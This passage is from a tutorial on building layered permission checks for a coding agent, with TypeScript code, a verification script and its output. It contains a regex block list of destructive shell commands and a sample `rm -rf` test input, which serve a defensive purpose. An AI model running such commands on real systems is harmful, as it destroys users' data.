  dontAsk + dangerous: { action: 'deny', message: 'Auto-denied (dontAsk mode): rm -rf /tmp/x' }
  bypassPermissions + dangerous: { action: 'allow' }
  ```

  This is the direct, concrete proof of Concept 2's table: the *same* dangerous command produces three different verdicts depending only on which mode is active — nothing about `isDangerous()` itself changes.

---

## Concept 4: Declarative allow/deny rules (Layer 1)

Regex-based dangerous-command detection is a fixed, code-level opinion about what's risky — the same for every project, every user, every command. Real usage needs a way to override that opinion per-project or per-user: pre-approve a command you run constantly (`npm test`), or pre-block one the built-in detector doesn't even know about (say, a deploy script). Real Claude Code supports this through a genuinely large rule system — 8 distinct rule sources with a strict precedence order, 3 rule behaviors (`allow`/`deny`/`ask`), and 3 matching strategies (exact, prefix, wildcard) — read directly from `claude-code/src/utils/permissions/permissionRuleParser.ts` and cross-confirmed in `how-claude-code-works/docs/11-permission-security.md`, §12.3.

This phase implements a deliberately smaller version: **2 rule sources** (user-level and project-level, not real Claude Code's 8), **2 rule behaviors** (`allow`/`deny`, not 3 — no `ask`), and **2 matching strategies** (exact and trailing-wildcard prefix, not real Claude Code's exact/prefix/full-wildcard trio). This mirrors the reference project's own explicitly-stated simplification (`claude-code-from-scratch/docs/06-permissions.md`, line 63: *"8 种规则来源简化为 2 种（用户级 + 项目级），3 种规则行为简化为 2 种（allow + deny）"*).

**Rule format.** A rule string is either a bare tool name (matches every call to that tool) or `toolName(pattern)` (matches only calls whose relevant argument matches `pattern`). Parsing this, read directly from `claude-code-from-scratch/src/tools.ts`, lines 541-547:

```typescript
// claude-code-from-scratch/src/tools.ts, lines 541-547 (quoted directly)
function parseRule(rule: string): ParsedRule {
  const match = rule.match(/^([a-z_]+)\((.+)\)$/);
  if (match) {
    return { tool: match[1], pattern: match[2] };
  }
  return { tool: rule, pattern: null };
}
```

**Matching.** For `run_shell`, the pattern matches against the `command` string; for anything else, against `file_path`. A pattern ending in `*` is a prefix match; otherwise it must match exactly. Read directly, `claude-code-from-scratch/src/tools.ts`, lines 581-597:

```typescript
// claude-code-from-scratch/src/tools.ts, lines 581-597 (quoted directly)
function matchesRule(rule: ParsedRule, toolName: string, input: Record<string, any>): boolean {
  if (rule.tool !== toolName) return false;
  if (!rule.pattern) return true; // Matches all invocations of this tool

  let value = "";
  if (toolName === "run_shell") value = input.command || "";
  else if (input.file_path) value = input.file_path;
  else return true; // No specific value, tool name match is enough

  const pattern = rule.pattern;
  if (pattern.endsWith("*")) {
    return value.startsWith(pattern.slice(0, -1));
  }
  return value === pattern;
}
```

A sharp edge worth internalizing rather than discovering the hard way: `run_shell(np*)` matches **both** `npm install` and `npx create-app` — a bare prefix match has no notion of "word boundary." Real Claude Code's actual wildcard matcher has a documented refinement for exactly this shape (a trailing ` *` — space then star — collapses to an optional-suffix match so `git *` behaves consistently whether or not arguments follow: `how-claude-code-works/docs/11-permission-security.md`, §12.3, quoting `src/utils/permissions/shellRuleMatching.ts`'s regex-collapsing logic) — this phase's simpler prefix-only matcher doesn't have that refinement, so writing `run_shell(npm:*)`-style rules requires the same care the reference project calls out directly (`claude-code-from-scratch/docs/06-permissions.md`, line 285: *"注意：`run_shell(np*)` 会同时匹配 `npm` 和 `npx`，写规则时注意前缀精确度"* — "note: `run_shell(np*)` matches both `npm` and `npx`; be precise about prefixes when writing rules").

**Two files, merged, not overridden.** A user-level file (`~/.claude/settings.json`) and a project-level file (`.claude/settings.json` in the current working directory) are both loaded, and their rules are **appended into the same array**, not one replacing the other — so a rule from either file can fire. Read directly, `claude-code-from-scratch/src/tools.ts`, lines 556-579 (`loadPermissionRules`), including the in-memory cache (rules are read from disk once per process, not once per tool call — a session can easily have dozens of tool calls, and `.claude/settings.json` isn't expected to change mid-session).

**Deny checked before allow — and why that ordering is not arbitrary.** `checkPermissionRules()` walks the `deny` array first; only if nothing in `deny` matches does it check `allow`:

```typescript
// claude-code-from-scratch/src/tools.ts, lines 599-614 (quoted directly)
function checkPermissionRules(
  toolName: string,
  input: Record<string, any>
): "allow" | "deny" | null {
  const rules = loadPermissionRules();

  for (const rule of rules.deny) {
    if (matchesRule(rule, toolName, input)) return "deny";
  }
  for (const rule of rules.allow) {
    if (matchesRule(rule, toolName, input)) return "allow";
  }
  return null; // No matching rule, fall through to default logic
}
```

Here's the concrete reason this ordering matters, not just an abstract security platitude: if `allow` were checked first, a broad `allow: ["run_shell(git *)"]` rule (a completely reasonable thing to write — "I trust git commands") would make it *impossible* to carve out `deny: ["run_shell(git push --force*)"]` on top of it, because the broad allow rule would already have matched and returned before the narrower deny rule was ever consulted. Checking deny first is exactly what makes "allow broadly, then deny narrowly" — the natural way anyone actually writes a policy — a coherent, working pattern instead of a trap. The reference project states this directly: *"为什么 deny 优先于 allow：这是安全系统的标准设计。allow 优先的话，一旦你写了 `allow: ["run_shell"]` 就没法用 deny 排除危险子命令了"* (`claude-code-from-scratch/docs/06-permissions.md`, line 612). Real Claude Code's own priority list (8 rule sources, `policySettings` — enterprise-managed — highest) has the identical property one level up: a lower-priority source can never override a higher-priority `deny`, for the same reason (`how-claude-code-works/docs/11-permission-security.md`, §12.3's priority table).

---

## Implement 4: Add declarative allow/deny rules, finalize `checkPermission`

- [ ] Replace `src/permissions.ts` with this (complete file, replacing Implement 3's version — adds rule parsing/loading/matching as a new Layer 1, checked before everything else in `checkPermission`):

  ```typescript
  import { existsSync, readFileSync } from "node:fs";
  import { join } from "node:path";
  import { homedir } from "node:os";

  // ─── 5 trust modes ────────────────────────────────────────────────────
  // Named identically to real Claude Code's 5 external modes
  // (claude-code/src/types/permissions.ts, EXTERNAL_PERMISSION_MODES).

  export type PermissionMode =
    | "default"
    | "plan"
    | "acceptEdits"
    | "bypassPermissions"
    | "dontAsk";

  export interface PermissionDecision {
    action: "allow" | "deny" | "confirm";
    message?: string;
  }

  // ─── Layer 2: built-in dangerous-command detection ───────────────────
  // 16 regexes covering the most common destructive shell operations.
  // Adapted verbatim from claude-code-from-scratch/src/tools.ts, lines
  // 503-521 (Concept 3).

  const DANGEROUS_PATTERNS: RegExp[] = [
    /\brm\s/,
    /\bgit\s+(push|reset|clean|checkout\s+\.)/,
    /\bsudo\b/,
    /\bmkfs\b/,
    /\bdd\s/,
    />\s*\/dev\//,
    /\bkill\b/,
    /\bpkill\b/,
    /\breboot\b/,
    /\bshutdown\b/,
    /\bdel\s/i,
    /\brmdir\s/i,
    /\bformat\s/i,
    /\btaskkill\s/i,
    /\bRemove-Item\s/i,
    /\bStop-Process\s/i,
  ];

  export function isDangerous(command: string): boolean {
    return DANGEROUS_PATTERNS.some((p) => p.test(command));
  }

  // ─── Layer 1: declarative allow/deny rules ───────────────────────────
  // Adapted from claude-code-from-scratch/src/tools.ts, lines 529-614
  // (Concept 4). 2 sources (user + project), 2 behaviors (allow/deny),
  // 2 match strategies (exact, trailing-wildcard prefix) — a deliberately
  // smaller version of real Claude Code's 8-source, 3-behavior,
  // 3-match-strategy rule system.

  interface ParsedRule {
    tool: string;
    pattern: string | null;
  }

  interface PermissionRules {
    allow: ParsedRule[];
    deny: ParsedRule[];
  }

  // Loaded from disk once per process and cached — a session can have
  // dozens of tool calls, and .claude/settings.json isn't expected to
  // change mid-session.
  let cachedRules: PermissionRules | null = null;

  function parseRule(rule: string): ParsedRule {
    const match = rule.match(/^([a-z_]+)\((.+)\)$/);
    if (match) {
      return { tool: match[1], pattern: match[2] };
    }
    return { tool: rule, pattern: null };
  }

  function loadSettings(filePath: string): any {
    if (!existsSync(filePath)) return null;
    try {
      return JSON.parse(readFileSync(filePath, "utf-8"));
    } catch {
      return null;
    }
  }

  export function loadPermissionRules(): PermissionRules {
    if (cachedRules) return cachedRules;

    const allow: ParsedRule[] = [];
    const deny: ParsedRule[] = [];

    // Two sources, merged (appended), not one overriding the other.
    const userSettings = loadSettings(join(homedir(), ".claude", "settings.json"));
    const projectSettings = loadSettings(join(process.cwd(), ".claude", "settings.json"));

    for (const settings of [userSettings, projectSettings]) {
      if (!settings?.permissions) continue;
      if (Array.isArray(settings.permissions.allow)) {
        for (const r of settings.permissions.allow) allow.push(parseRule(r));
      }
      if (Array.isArray(settings.permissions.deny)) {
        for (const r of settings.permissions.deny) deny.push(parseRule(r));
      }
    }

    cachedRules = { allow, deny };
    return cachedRules;
  }

  // Exposed for tests/tooling that need to force a re-read of the settings
  // files within one process (this tutorial's own smoke test uses it).
  export function resetPermissionRuleCache(): void {
    cachedRules = null;
  }

  function matchesRule(
    rule: ParsedRule,
    toolName: string,
    input: Record<string, unknown>
  ): boolean {
    if (rule.tool !== toolName) return false;
    if (!rule.pattern) return true;

    let value = "";
    if (toolName === "run_shell") value = String(input.command ?? "");
    else if (typeof input.file_path === "string") value = input.file_path;
    else return true;

    const pattern = rule.pattern;
    if (pattern.endsWith("*")) {
      return value.startsWith(pattern.slice(0, -1));
    }
    return value === pattern;
  }

  function checkPermissionRules(
    toolName: string,
    input: Record<string, unknown>
  ): "allow" | "deny" | null {
    const rules = loadPermissionRules();

    // deny checked before allow — see Concept 4 for why this ordering is
    // load-bearing, not arbitrary.
    for (const rule of rules.deny) {
      if (matchesRule(rule, toolName, input)) return "deny";
    }
    for (const rule of rules.allow) {
      if (matchesRule(rule, toolName, input)) return "allow";
    }
    return null;
  }

  // ─── Unified permission check ────────────────────────────────────────
  // Priority: deny rule > allow rule > mode logic > dangerous-command
  // detection > default allow.

  export function checkPermission(
    toolName: string,
    input: Record<string, unknown>,
    readOnly: boolean,
    mode: PermissionMode = "default"
  ): PermissionDecision {
    if (mode === "bypassPermissions") return { action: "allow" };

    // Layer 1: declarative rules — checked before mode logic and before
    // dangerous-command detection, so a rule can override either one.
    const ruleResult = checkPermissionRules(toolName, input);
    if (ruleResult === "deny") {
      return { action: "deny", message: `Denied by permission rule for ${toolName}` };
    }
    if (ruleResult === "allow") {
      return { action: "allow" };
    }

    if (readOnly) return { action: "allow" };

    if (mode === "plan") {
      return { action: "deny", message: `Blocked in plan mode: ${toolName}` };
    }

    if (mode === "acceptEdits" && toolName === "edit_file") {
      return { action: "allow" };
    }

    // Layer 2: built-in dangerous-command detection.
    if (toolName === "run_shell" && isDangerous(String(input.command ?? ""))) {
      const command = String(input.command ?? "");
      if (mode === "dontAsk") {
        return { action: "deny", message: `Auto-denied (dontAsk mode): ${command}` };
      }
      return { action: "confirm", message: command };
    }

    return { action: "allow" };
  }
  ```

- [ ] Verify the "allow broadly, deny narrowly" pattern from Concept 4 actually works, using a real `.claude/settings.json`:

  ```bash
  cd /Users/grexrr/Documents/NAC
  mkdir -p .claude
  cat > .claude/settings.json <<'EOF'
  {
    "permissions": {
      "allow": ["run_shell(git *)"],
      "deny": ["run_shell(git push --force*)"]
    }
  }
  EOF
  npx tsx -e "
  import('./src/permissions.js').then((m) => {
    console.log('git status:', m.checkPermission('run_shell', { command: 'git status' }, false, 'default'));
    console.log('git push --force:', m.checkPermission('run_shell', { command: 'git push --force' }, false, 'default'));
  });
  "
  rm -rf .claude
  ```

  Actual output, captured while writing this tutorial against exactly this code and exactly this config file, in the isolated verification directory:

  ```
  git status: { action: 'allow' }
  git push --force: { action: 'deny', message: 'Denied by permission rule for run_shell' }
  ```

  This is the direct, concrete proof of Concept 4's central claim: `git push --force` matches *both* the broad `allow: ["run_shell(git *)"]` rule and the narrow `deny: ["run_shell(git push --force*)"]` rule, and the deny wins — because `checkPermissionRules()` walks `deny` first. Had the ordering been reversed, `git push --force` would have been silently allowed.

---

## Concept 5: Where the gate sits in the dispatch flow, and the session-level whitelist

Phase 2 built exactly one place every tool call funnels through — `executeTool(name, input, state)` in `tools.ts`, which looks the tool up by name and calls `tool.execute(input, state)` inside a `try`/`catch` (Phase 2, Concept 2). That single choke point is exactly where this phase's gate belongs: **before** `tool.execute()` runs, never after, and never scattered across individual tool implementations. This mirrors real Claude Code's own architecture at the layer this project actually has: production's `hasPermissionsToUseToolInner` (`claude-code/src/utils/permissions/permissions.ts`, lines 1158-1319, read directly) is called once, centrally, before any tool's own logic executes — not duplicated inside every one of the 66+ built-in tools.

One structural detail from the real source is worth calling out even though this phase's simpler `checkPermission()` doesn't need the full machinery: real Claude Code's central check resolves an undecided call to **`ask`**, not `allow`:

```typescript
// claude-code/src/utils/permissions/permissions.ts, lines 1299-1310 (quoted,
// abridged — the final fallback after every layer above has run)
const result: PermissionDecision =
  toolPermissionResult.behavior === 'passthrough'
    ? {
        ...toolPermissionResult,
        behavior: 'ask' as const,
        message: createPermissionRequestMessage(
          tool.name,
          toolPermissionResult.decisionReason,
        ),
      }
    : toolPermissionResult
```

This project's `checkPermission()` resolves an undecided call to `allow` instead (the final `return { action: "allow" }` in Implement 4). That's a real, deliberate difference worth being able to defend, not an oversight: real Claude Code's fail-safe-to-`ask` default exists because it has 66+ tools with wildly varying blast radii, many of which no rule or mode logic has an opinion about yet — resolving to `allow` there would silently approve tools nobody has reasoned about. This project's registry has exactly four tools, and every single one of them has an explicit, reasoned answer baked into `checkPermission()` (`read_file`/`list_files` always safe; `edit_file` gated by mode; `run_shell` gated by mode and the dangerous-pattern check) — there is no "unknown tool with unknown risk" case left over to fail safely on. If a fifth tool were added to this registry without updating `checkPermission()` to have an opinion about it, this design would silently allow it — which is exactly the failure mode real Claude Code's fail-closed default exists to prevent at production scale. This is a genuine, cited scope tradeoff, not a claim that `allow`-by-default is correct in general.

**The session-level whitelist.** Once a human approves one specific dangerous command via the confirmation prompt (Concept 6), re-asking the identical question every time the model repeats that exact call within the same conversation would be exhausting and would teach users to reflexively click "yes" without reading — the opposite of what a confirmation prompt is for. Real Claude Code and the reference project both solve this with a `Set` that remembers what's already been approved *for this conversation only* (not persisted to disk — that's a different, heavier action real Claude Code calls "always allow," which writes a new rule to `.claude/settings.json`). Read directly from `claude-code-from-scratch/docs/06-permissions.md`'s own worked example (agent.ts excerpt, lines 468-497):

```typescript
// claude-code-from-scratch/docs/06-permissions.md, agent.ts excerpt (quoted directly)
private confirmedPaths: Set<string> = new Set();

const perm = checkPermission(toolUse.name, input, this.permissionMode, this.planFilePath);

if (perm.action === "confirm" && perm.message && !this.confirmedPaths.has(perm.message)) {
  const confirmed = await this.confirmDangerous(perm.message);
  if (!confirmed) {
    toolResults.push({ /* ...denial result... */ });
    continue;
  }
  this.confirmedPaths.add(perm.message);
}
```

This project has no `Agent` class (Phase 4 kept the loop as a plain function, not an object with instance fields), so the equivalent state lives in a `PermissionState` object — created fresh once per `runAgentLoop()` call, exactly parallel to how `ReadFileState` is created fresh once per call (Phase 2, Concept 4) and how the abort controller is scoped per call (Phase 4, Concept 2):

```typescript
// src/tools.ts — new in this phase
export interface PermissionState {
  mode: PermissionMode;
  confirmedActions: Set<string>;
  confirmTool?: (message: string) => Promise<boolean>;
}
```

`confirmedActions` uses the exact command string (`decision.message`) as its key — the same string the reference project uses (`perm.message`). This means the whitelist is keyed on the *literal command text*, not a normalized or pattern-based form: approving `rm -rf ./build` once will not silently pre-approve `rm -rf ./dist` later in the same conversation — that would require a new, separately-confirmed call, exactly as strict as the reference implementation's own choice.

---

## Implement 5: Modify `tools.ts`'s `executeTool()` to gate on `checkPermission()`

- [ ] Modify `src/tools.ts` — add the `PermissionState` interface, import `checkPermission` and `PermissionMode` from the new `permissions.ts`, and change `executeTool()`'s signature and body. This is the complete file as of this step (the registry, `readFile`/`editFile`/`listFiles`/`runShell`, and `findTool`/`getToolSchemas` are unchanged from Implement 1):

  ```typescript
  import Anthropic from "@anthropic-ai/sdk";
  import { readFileSync, writeFileSync, existsSync, readdirSync, statSync } from "node:fs";
  import { execSync } from "node:child_process";
  import { resolve } from "node:path";
  import { checkPermission, type PermissionMode } from "./permissions.js";

  export type ReadFileState = Map<string, number>;

  /**
   * Per-conversation permission state, threaded through every executeTool()
   * call exactly the way ReadFileState is. mode is fixed for the life of
   * one runAgentLoop() call; confirmedActions is the session-level
   * whitelist that grows as the user approves "confirm"-tier actions
   * (Concept 5); confirmTool is the REPL-supplied y/n prompt (undefined in
   * one-shot / non-interactive mode — see Concept 6).
   */
  export interface PermissionState {
    mode: PermissionMode;
    confirmedActions: Set<string>;
    confirmTool?: (message: string) => Promise<boolean>;
  }

  export interface ToolDefinition {
    name: string;
    description: string;
    input_schema: Anthropic.Tool["input_schema"];
    readOnly: boolean;
    execute(
      input: Record<string, unknown>,
      state: ReadFileState
    ): string | Promise<string>;
  }

  function readFile(input: { file_path: string }, state: ReadFileState): string {
    const absPath = resolve(input.file_path);
    try {
      const content = readFileSync(absPath, "utf-8");
      state.set(absPath, statSync(absPath).mtimeMs);
      const numbered = content
        .split("\n")
        .map((line, i) => `${String(i + 1).padStart(4)} | ${line}`)
        .join("\n");
      return numbered;
    } catch (e) {
      return `Error reading file: ${(e as Error).message}`;
    }
  }

  function editFile(
    input: { file_path: string; old_string: string; new_string: string },
    state: ReadFileState
  ): string {
    const absPath = resolve(input.file_path);

    if (!existsSync(absPath)) {
      return `Error: file not found: ${input.file_path}`;
    }

    if (!state.has(absPath)) {
      return `Error: you must read_file("${input.file_path}") before editing it.`;
    }

    const lastKnownMtime = state.get(absPath)!;
    const currentMtime = statSync(absPath).mtimeMs;
    if (currentMtime !== lastKnownMtime) {
      return `Error: ${input.file_path} was modified on disk since you last read it. Call read_file again before editing.`;
    }

    const content = readFileSync(absPath, "utf-8");
    const count = content.split(input.old_string).length - 1;
    if (count === 0) {
      return `Error: old_string not found in ${input.file_path}`;
    }
    if (count > 1) {
      return `Error: old_string found ${count} times in ${input.file_path}. Must be unique — add more surrounding context to old_string.`;
    }

    const newContent = content.split(input.old_string).join(input.new_string);
    writeFileSync(absPath, newContent);

    state.set(absPath, statSync(absPath).mtimeMs);

    return `Successfully edited ${input.file_path}`;
  }

  function listFiles(input: { path?: string }): string {
    const dirPath = resolve(input.path ?? ".");
    try {
      const entries = readdirSync(dirPath, { withFileTypes: true });
      if (entries.length === 0) {
        return `(empty directory: ${dirPath})`;
      }
      return entries
        .map((e) => `${e.isDirectory() ? "d" : "f"}  ${e.name}`)
        .sort()
        .join("\n");
    } catch (e) {
      return `Error listing directory: ${(e as Error).message}`;
    }
  }

  function runShell(input: { command: string; timeout?: number }): string {
    try {
      const result = execSync(input.command, {
        encoding: "utf-8",
        maxBuffer: 5 * 1024 * 1024,
        timeout: input.timeout ?? 30000,
        stdio: ["pipe", "pipe", "pipe"],
      });
      return result || "(no output)";
    } catch (e: any) {
      const stderr = e.stderr ? `\nStderr: ${e.stderr}` : "";
      const stdout = e.stdout ? `\nStdout: ${e.stdout}` : "";
      return `Command failed (exit code ${e.status})${stdout}${stderr}`;
    }
  }

  export const toolRegistry: ToolDefinition[] = [
    {
      name: "read_file",
      description:
        "Read the contents of a file. Returns the file content with line numbers.",
      input_schema: {
        type: "object",
        properties: {
          file_path: { type: "string", description: "The path to the file to read" },
        },
        required: ["file_path"],
      },
      readOnly: true,
      execute: (input, state) => readFile(input as { file_path: string }, state),
    },
    {
      name: "edit_file",
      description:
        "Edit a file by replacing an exact string match with new content. The old_string must match exactly, including whitespace and indentation, and must be unique within the file. You must call read_file on this file earlier in the conversation before calling edit_file.",
      input_schema: {
        type: "object",
        properties: {
          file_path: { type: "string", description: "The path to the file to edit" },
          old_string: { type: "string", description: "The exact string to find and replace" },
          new_string: { type: "string", description: "The string to replace it with" },
        },
        required: ["file_path", "old_string", "new_string"],
      },
      readOnly: false,
      execute: (input, state) =>
        editFile(
          input as { file_path: string; old_string: string; new_string: string },
          state
        ),
    },
    {
      name: "list_files",
      description:
        "List the contents of a directory (non-recursive). Returns one entry per line, prefixed with 'd' for directories and 'f' for files.",
      input_schema: {
        type: "object",
        properties: {
          path: {
            type: "string",
            description: "The directory to list. Defaults to the current working directory.",
          },
        },
        required: [],
      },
      readOnly: true,
      execute: (input) => listFiles(input as { path?: string }),
    },
    {
      name: "run_shell",
      description:
        "Execute a shell command and return its output. Use this for running tests, installing packages, git operations, etc. Destructive-looking commands trigger a confirmation prompt.",
      input_schema: {
        type: "object",
        properties: {
          command: { type: "string", description: "The shell command to execute" },
          timeout: { type: "number", description: "Timeout in milliseconds (default: 30000)" },
        },
        required: ["command"],
      },
      readOnly: false,
      execute: (input) => runShell(input as { command: string; timeout?: number }),
    },
  ];

  export function findTool(name: string): ToolDefinition | undefined {
    return toolRegistry.find((t) => t.name === name);
  }

  export function getToolSchemas(): Anthropic.Tool[] {
    return toolRegistry.map(({ name, description, input_schema }) => ({
      name,
      description,
      input_schema,
    }));
  }

  /**
   * Look up a tool by name and run it — but first, gate it through
   * checkPermission(). This is the one dispatch point every tool call
   * funnels through (Phase 2, Concept 2), so it's also the one place the
   * permission gate needs to sit: before tool.execute() runs, never after
   * (Concept 5).
   */
  export async function executeTool(
    name: string,
    input: Record<string, unknown>,
    state: ReadFileState,
    permission: PermissionState
  ): Promise<string> {
    const tool = findTool(name);
    if (!tool) {
      return `Unknown tool: ${name}`;
    }

    const decision = checkPermission(name, input, tool.readOnly, permission.mode);

    if (decision.action === "deny") {
      return `Action denied: ${decision.message ?? name}`;
    }

    if (decision.action === "confirm") {
      const key = decision.message ?? name;
      if (!permission.confirmedActions.has(key)) {
        if (!permission.confirmTool) {
          // No interactive handler available (one-shot / non-interactive
          // mode) — fail closed, exactly like dontAsk mode, rather than
          // silently allowing or hanging forever waiting for an answer
          // that will never come.
          return `Action denied: confirmation required but no interactive confirmation handler is available (non-interactive mode): ${key}`;
        }
        const approved = await permission.confirmTool(key);
        if (!approved) {
          return "User denied this action.";
        }
        permission.confirmedActions.add(key);
      }
    }

    try {
      return await tool.execute(input, state);
    } catch (e) {
      return `Error executing ${name}: ${(e as Error).message}`;
    }
  }
  ```

Notice exactly what changed from Implement 1's version: `executeTool()` gained a fourth parameter (`permission: PermissionState`) and a block of gating logic sits between the `findTool()` lookup and the existing `try { return await tool.execute(...) }` — that `try`/`catch` block itself, and everything above it in the file, is untouched. This is the same "clean seam, not a rewrite" property Phase 1 and Phase 2 both called out for their own extension points.

A denied or user-rejected call returns a **string**, exactly like every other failure path in this registry (Phase 2, Concept 2: "errors are data, not exceptions"). The model sees `"Action denied: ..."` or `"User denied this action."` as an ordinary `tool_result` and can react to it in its very next turn — apologize, try a different approach, or ask the user directly — rather than the whole loop crashing or silently stalling.

---

## Concept 6: The confirmation prompt UX, wired into Phase 4's REPL

Everything so far produces a *verdict* — `allow`, `deny`, or `confirm`. Turning a `confirm` verdict into an actual question a human answers requires interactive stdin, and Phase 4 already established the only place in this project that owns that: the REPL's `readline.createInterface({ input: process.stdin, output: process.stdout })` instance, created once per `runRepl()` call (Phase 4, Step 3). This phase does not create a second `readline` interface for confirmation prompts — it reuses the exact same `rl` the REPL already has, via `rl.question(...)`.

**Why this is safe to do mid-turn, and not a race with the REPL's own line-reading.** Recall Phase 4's `askQuestion()` structure: it calls `rl.once("line", async (line) => { ... })`, and critically, `askQuestion()` (which re-arms that listener) is only called again **after** the current turn's `runAgentLoop()` call and its `finally` block have both fully completed (Phase 4, Step 3 — the `askQuestion()` call sits as the very last line inside the `rl.once("line", ...)` callback). That means for the entire duration of one call to `runAgentLoop()` — including any tool executions inside it — there is no second `rl.once("line", ...)` listener pending. Calling `rl.question(...)` on the same `rl` instance during that window is therefore safe: there's exactly one thing listening for the next line of input at any given moment, whether that's the REPL waiting for the user's next message or a confirmation prompt waiting for a `y`/`n` answer.

```typescript
// src/cli.ts — new in this phase, inside runRepl()
function confirmTool(message: string): Promise<boolean> {
  return new Promise((promiseResolve) => {
    console.log(`\n  Confirm: ${message}`);
    rl.question("  Allow? (y/n): ", (answer) => {
      promiseResolve(answer.trim().toLowerCase().startsWith("y"));
    });
  });
}
```

This is structurally identical to the reference project's own confirmation dialog (`claude-code-from-scratch/docs/06-permissions.md`, agent.ts excerpt):

```typescript
// claude-code-from-scratch/docs/06-permissions.md, agent.ts excerpt (quoted directly)
private async confirmDangerous(command: string): Promise<boolean> {
  printConfirmation(command);
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((resolve) => {
    rl.question("  Allow? (y/n): ", (answer) => {
      rl.close();
      resolve(answer.toLowerCase().startsWith("y"));
    });
  });
}
```

with one deliberate difference: the reference implementation creates (and closes) a **new** `readline` interface for every single confirmation, because its `Agent` class has no REPL of its own to borrow one from at the point `confirmDangerous` is defined. This project's REPL already owns a long-lived `rl` for the whole session (Phase 4), so reusing it — rather than opening and closing a second interface layered on top of the same `process.stdin` — is the more natural choice here, and avoids the (real, if usually harmless) risk of two independent `readline` interfaces both attached to the same stream at once.

**An honest, flagged limitation: Ctrl+C during a pending confirmation prompt doesn't unstick it immediately.** Phase 4's SIGINT handler checks `currentController` to decide whether the agent is "busy," and sets it the moment a turn starts (Phase 4, Concept 2) — Phase 5 didn't touch this handler at all (Phase 5, Step 4 only touched the one `runAgentLoop()` call site's options and the post-call printing). While a confirmation prompt is showing, `currentController` is still set (the turn is still in progress, just paused waiting for a `y`/`n` answer), so pressing Ctrl+C at that exact moment calls `currentController.abort()` and prints `(interrupted)` — but that only aborts the *next* `client.messages.stream()` call's signal (Phase 5 replaced `.create()` with `.stream()`, and `signal` is threaded through to it unchanged — Phase 5, Concept 5); it does **not** cancel the pending `rl.question(...)` callback. Reasoning this through against Phase 5's actual code, not assuming: Phase 5, Concept 5 proved that an already-aborted `AbortSignal` makes `await stream.finalMessage()` reject with `Anthropic.APIUserAbortError`, the exact same failure mode Phase 4 proved for `await client.messages.create()` — so the underlying mechanic is unchanged by streaming, only the specific `await` that surfaces the rejection moved from `create()` to `stream.finalMessage()` inside `streamOneTurn`. Concretely: the REPL will still print `(interrupted)` and reprint the prompt, but the earlier `await permission.confirmTool(...)` call (reached from the post-turn tool-processing loop, after that turn's `streamOneTurn` had already resolved — `run_shell` and `edit_file` are never early-started, Concept 5 above) is still alive underneath, waiting for an answer that, once given, will resolve into a tool result that gets appended to `messages` before the loop's *next* iteration calls `streamOneTurn` again and its `stream.finalMessage()` immediately rejects against the already-aborted signal (the same "abort takes effect one iteration later" mechanic Phase 4, Concept 2 proved for tool execution in general, still holding unchanged under streaming — the confirmation prompt and the tool execution it gates are exactly as untethered from `signal` as they were before Phase 5). This is a real, traceable interaction between two features built in different phases, not a new bug this phase introduces — and it's reasoned through from reading Phase 5's actual streaming code, not independently exercised against a live, timed keypress (see the Verify section's own note on this).

---

## Implement 6: Thread `permissionMode` and `confirmTool` through `agent.ts` and `cli.ts`

- [ ] Modify `src/agent.ts` — add two new optional fields to `RunAgentLoopOptions` (keeping Phase 5's `onText?` field) and build a fresh `PermissionState` once per call, threaded into **both** of Phase 5's `executeTool()` call sites: the early-execution one inside `onToolBlockComplete`, and the post-turn one in the tool-processing loop. This is the complete file — the diff is against **Phase 5's version** (Phase 5, Step 3), not Phase 4's: `streamOneTurn`, `TrackedToolBlock`, the `while (true)` loop shape, the `earlyExecutions` map, and both `messages.push` calls are all byte-for-byte unchanged from Phase 5:

  ```typescript
  import Anthropic from "@anthropic-ai/sdk";
  import { executeTool, findTool, type ReadFileState, type PermissionState } from "./tools.js";
  import type { PermissionMode } from "./permissions.js";

  export type AgentMessage = Anthropic.MessageParam;

  export interface RunAgentLoopOptions {
    client: Anthropic;
    model: string;
    systemPrompt?: string;
    tools?: Anthropic.Tool[];
    maxTokens?: number;
    signal?: AbortSignal;
    onText?: (textDelta: string) => void;
    permissionMode?: PermissionMode;
    confirmTool?: (message: string) => Promise<boolean>;
  }

  interface TrackedToolBlock {
    id: string;
    name: string;
    caller: Anthropic.ToolUseBlock["caller"];
    inputJson: string;
  }

  /**
   * Streams one turn of the Messages API. Forwards text deltas to onText as
   * they arrive, and fires onToolBlockComplete the instant a tool_use
   * block's accumulated JSON is confirmed complete and parsed
   * (content_block_stop) — which can happen while the rest of the turn
   * (further text, or another tool_use block) is still streaming (Phase 5,
   * Concept 4). Byte-for-byte unchanged from Phase 5, Step 3 — this phase
   * adds no new parameters here; permission gating happens inside
   * executeTool() itself (tools.ts, Implement 5), not in this streaming plumbing.
   */
  async function streamOneTurn(
    messages: AgentMessage[],
    options: {
      client: Anthropic;
      model: string;
      systemPrompt?: string;
      tools?: Anthropic.Tool[];
      maxTokens: number;
      signal?: AbortSignal;
      onText?: (textDelta: string) => void;
      onToolBlockComplete: (block: Anthropic.ToolUseBlock) => void;
    }
  ): Promise<Anthropic.Message> {
    const { client, model, systemPrompt, tools, maxTokens, signal, onText, onToolBlockComplete } =
      options;

    const stream = client.messages.stream(
      { model, max_tokens: maxTokens, system: systemPrompt, tools, messages },
      { signal }
    );

    if (onText) {
      stream.on("text", (textDelta) => onText(textDelta));
    }

    const toolBlocksByIndex = new Map<number, TrackedToolBlock>();

    stream.on("streamEvent", (event) => {
      if (event.type === "content_block_start" && event.content_block.type === "tool_use") {
        toolBlocksByIndex.set(event.index, {
          id: event.content_block.id,
          name: event.content_block.name,
          caller: event.content_block.caller,
          inputJson: "",
        });
      } else if (event.type === "content_block_delta" && event.delta.type === "input_json_delta") {
        const tracked = toolBlocksByIndex.get(event.index);
        if (tracked) tracked.inputJson += event.delta.partial_json;
      } else if (event.type === "content_block_stop") {
        const tracked = toolBlocksByIndex.get(event.index);
        if (tracked) {
          let input: Record<string, unknown> = {};
          try {
            input = JSON.parse(tracked.inputJson || "{}");
          } catch {
            // Malformed JSON at stop shouldn't happen per the API contract,
            // but degrade to an empty input rather than throwing inside a
            // stream event handler (Phase 2, Concept 2's "errors are data").
          }
          onToolBlockComplete({
            type: "tool_use",
            id: tracked.id,
            name: tracked.name,
            caller: tracked.caller,
            input,
          });
          toolBlocksByIndex.delete(event.index);
        }
      }
    });

    return stream.finalMessage();
  }

  /**
   * The agent loop. Same shape since Phase 1: call the model, check for
   * tool_use blocks, execute them, push exactly two entries per turn,
